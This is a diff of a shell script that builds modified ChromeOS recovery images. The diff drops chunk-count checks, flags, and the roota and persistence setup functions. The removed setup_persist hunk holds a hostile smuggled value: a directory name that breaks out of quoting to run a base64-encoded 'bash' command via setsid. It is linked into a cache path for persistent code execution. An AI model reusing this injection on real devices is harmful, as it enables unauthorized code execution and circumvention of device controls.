@@ -169,11 +169,6 @@ detect_image_features() {
 		fail "Could not find /usr/sbin/chromeos-install"
 	fi
 	log_info "Detected chunks: $CHUNKS"
-	if [ $IMAGE_VERSION -lt 86 ] && [ $CHUNKS -ne 1 ]; then
-		fail "Unexpected chunk count (expected 1)"
-	elif [ $IMAGE_VERSION -ge 86 ] && [ $CHUNKS -ne 4 ]; then
-		fail "Unexpected chunk count (expected 4)"
-	fi
 	log_info "Detected LVM stateful: $(fancy_bool $LVM_STATEFUL)"
 
 	ROOTA_BASE_SIZE=$((1024 * 1024 * 1024 * 4))
@@ -237,20 +232,6 @@ determine_internal_disk() {
 	log_info "Internal disk: $INTERNAL_DISK"
 }
 
-confirm_fourths_mode() {
-	local estimated_size selected
-	estimated_size=$(((ROOTA_BASE_SIZE + OVERFLOW_SIZE) * CHUNKS))
-	log_warn "You have selected basic/persist when postinst is available, image size will be very large (about $(format_bytes $estimated_size))"
-	if [ $YES -eq 0 ]; then
-		echo "Do you want to continue? (y/N)"
-		read -re selected
-		case "$selected" in
-			[yY]) : ;;
-			*) fail "Aborting..." ;;
-		esac
-	fi
-}
-
 mkpayload() {
 	local name file
 	if [ $PAYLOAD_ONLY -eq 1 ]; then
@@ -266,32 +247,6 @@ mkpayload() {
 
 mkfs() {
 	mkfs.ext4 -F -b 4096 -O ^metadata_csum,uninit_bg "$@"
-}
-
-setup_roota() {
-	local src_dir
-	src_dir="$SCRIPT_DIR"/postinst
-	[ -d "$src_dir" ] || fail "Could not find postinst payload '$src_dir'"
-	suppress mkfs "$1"
-	MNT_ROOT=$(mktemp -d)
-	mount -o loop "$1" "$MNT_ROOT"
-
-	cp -R "$src_dir"/* "$MNT_ROOT"
-	chmod +x "$MNT_ROOT"/postinst
-
-	umount "$MNT_ROOT"
-	rmdir "$MNT_ROOT"
-}
-
-setup_persist() {
-	local src_dir cmd_dir
-	src_dir="$SCRIPT_DIR"/persist
-	[ -d "$src_dir" ] || fail "Could not find persistence payload '$src_dir'"
-	mkdir -p "$MNT_ENCSTATEFUL"/var/lib/whitelist/persist "$MNT_ENCSTATEFUL"/var/cache "$MNT_STATE"/unencrypted/import_extensions
-	cp -R "$src_dir"/* "$MNT_ENCSTATEFUL"/var/lib/whitelist/persist
-	cmd_dir="---persist---';echo $(echo 'bash <(cat /var/lib/whitelist/persist/init.sh)'|base64 -w0)|base64 -d|setsid -f bash;echo '"
-	mkdir "$MNT_ENCSTATEFUL/var/lib/whitelist/$cmd_dir"
-	ln -s "/var/lib/whitelist/$cmd_dir" "$MNT_ENCSTATEFUL"/var/cache/external_cache
 }
 
 find_unallocated_sectors() {
@@ -372,15 +327,11 @@ get_flags() {
 
 	DEFINE_string image "" "Path to recovery image" "i"
 
-	DEFINE_string internal_disk "" "Internal disk for postinst_sym (mmcblk0, mmcblk1, nvme0n1, sda...)"
-
 	DEFINE_boolean yes "$FLAGS_FALSE" "Assume yes for all questions" "y"
 
 	DEFINE_boolean payload_only "$FLAGS_FALSE" "Generate payloads but don't modify image (image not required)" ""
 
 	DEFINE_string encstateful_payload "" "Path to custom encstateful payload (tar)" "p"
-
-	DEFINE_boolean devmode "$FLAGS_FALSE" "Create .developer_mode (persist, basic only)" "e"
 
 	DEFINE_string finalsizefile "" "Write final image size in bytes to this file" ""
 
@@ -402,22 +353,12 @@ get_flags() {
 		flags_help || :
 		exit 1
 	fi
-	if [ -n "$FLAGS_encstateful_payload" ] && [ "$FLAGS_type" != basic ]; then
-		echo "Must specify --type=basic when using --encstateful_payload"
-		flags_help || :
-		exit 1
-	fi
 }
 
 [ -z "$SUDO_USER" ] || USER="$SUDO_USER"
 get_flags "$@"
 
-BASIC_VERSION=1
 PAST_2038=0
-ENABLE_POSTINST=0
-ENABLE_POSTINST_SYM=0
-ENABLE_PERSIST=0
-ENABLE_BASIC=0
 
 # this will always be enabled
 ENABLE_UNVERIFIED=1
@@ -428,10 +369,6 @@ if [ -z "$IMAGE" ]; then
 	LVM_STATEFUL=1
 	LAYOUTV3=1
 	SUPPORTS_BIG_DATE=1
-	ENABLE_POSTINST=1
-	ENABLE_POSTINST_SYM=1
-	ENABLE_PERSIST=1
-	ENABLE_BASIC=1
 else
 	if [ -b "$IMAGE" ]; then
 		log_info "Image is a block device, performance may suffer..."
